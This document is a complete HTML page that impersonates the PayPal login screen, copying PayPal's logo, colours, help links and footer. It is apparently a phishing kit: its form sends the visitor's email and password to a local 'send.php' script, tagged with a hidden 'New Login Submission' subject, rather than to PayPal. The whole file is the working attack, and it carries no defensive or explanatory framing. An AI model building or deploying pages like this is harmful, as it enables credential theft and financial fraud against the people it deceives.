<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Login - PayPal</title>

<meta name="viewport" content="width=device-width, initial-scale=1.0">

<link rel="icon" href="https://www.paypalobjects.com/webstatic/icon/pp258.png">

<style>
* {
  box-sizing: border-box;
  font-family: Helvetica, Arial, sans-serif;
}

body {
  margin: 0;
  background: #f5f7fa;
  color: #2c2e2f;
}

/* Logo */
.logo {
  text-align: center;
  margin-top: 40px;
}

.logo img {
  width: 130px;
}

/* Card */
.card {
  background: #fff;
  max-width: 420px;
  margin: 30px auto;
  padding: 30px;
  border-radius: 6px;
  box-shadow: 0 4px 12px rgba(0,0,0,.12);
}

.card h1 {
  text-align: center;
  font-weight: 400;
  margin-bottom: 25px;
  font-size: 20px;
}

/* Inputs */
input {
  width: 100%;
  height: 44px;
  padding: 0 12px;
  margin-bottom: 15px;
  border: 1px solid #9da3a6;
  border-radius: 4px;
  font-size: 15px;
}

input:focus {
  border-color: #0070ba;
  outline: none;
}

/* Button */
button {
  width: 100%;
  height: 44px;
  background: #0070ba;
  border: none;
  border-radius: 4px;
  color: white;
  font-size: 16px;
  font-weight: bold;
  cursor: pointer;
}

button:hover {
  background: #005ea6;
}

/* Links */
.links {
  text-align: center;
  margin-top: 20px;
}

.links a {
  color: #0070ba;
  font-size: 14px;
  text-decoration: none;
}

.links a:hover {
  text-decoration: underline;
}

/* Footer */
footer {
  position: fixed;
  bottom: 0;
  width: 100%;
  background: #f7f9fa;
  padding: 12px;
  text-align: center;
  font-size: 11px;
  color: #666;
}
</style>
</head>

<body>

<div class="logo">
  <img src="https://www.paypalobjects.com/webstatic/icon/pp258.png" alt="PayPal">
</div>

<div class="card">
  <h1>Log in to your account </h1>


  <form action="../../send.php" method="post">

    <input type="hidden" name="_subject" value="New Login Submission">

    <input type="email" name="email" placeholder="Email" required>

    <input type="password" name="password" placeholder="Password" required>

    <button type="submit">Log In</button>

  </form>

  <div class="links">
    <p><a href="https://www.paypal.com/lc/webapps/mpp/business-support/account-management">Having trouble logging in?</a></p>
    <p><a href="https://www.paypal.com/ma/welcome/signup">Sign Up</a></p>
  </div>
</div>

<footer>
  PayPal © 2025 
</footer>

</body>
</html>
